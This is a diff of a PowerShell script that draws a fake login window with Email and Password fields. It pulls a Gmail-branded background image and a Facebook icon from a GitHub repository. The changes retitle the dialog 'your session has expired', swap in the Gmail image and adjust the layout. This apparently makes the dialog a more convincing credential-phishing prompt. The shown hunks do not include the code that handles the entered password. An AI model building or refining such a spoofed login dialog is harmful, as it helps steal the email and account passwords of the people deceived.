@@ -85,7 +85,7 @@ Write-Host "The user clicked: $Result"
 
 
 # Define the URL to the image hosted on GitHub
-$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/gm.jpg"
+$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/gmail.png"
 # Define the URL to the icon hosted on GitHub
 $iconUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.ico"
 $iconFilePath = Join-Path $env:TEMP "custom_icon.ico"
@@ -97,7 +97,7 @@ $XAML = @"
 <Window
     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-    Title="Authentication Required" Height="350" Width="450" WindowStartupLocation="CenterScreen">
+    Title="your session has expired" Height="600" Width="540" WindowStartupLocation="CenterScreen">
     <Grid>
         <Image Source="$imageUrl" Stretch="Fill" />
         <Grid Background="Transparent">
@@ -111,16 +111,16 @@ $XAML = @"
             <TextBlock Grid.Row="0" Text="" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" Foreground="White"/>
 
             <StackPanel Grid.Row="1" Orientation="Vertical" HorizontalAlignment="Center">
-                <Label Content="Email:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
+                <Label Content="Email:" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Center"/>
                 <TextBox Name="Username" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
             </StackPanel>
 
             <StackPanel Grid.Row="2" Orientation="Vertical" HorizontalAlignment="Center">
-                <Label Content="Password:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
+                <Label Content="Password:" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Center"/>
                 <PasswordBox Name="Password" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
             </StackPanel>
 
-            <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" VerticalAlignment="Top" Width="100" Name="LoginButton"/>
+            <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" VerticalAlignment="Top" Width="100" Name="LoginButton" Margin="0,20,0,0"/>
         </Grid>
     </Grid>
 </Window>
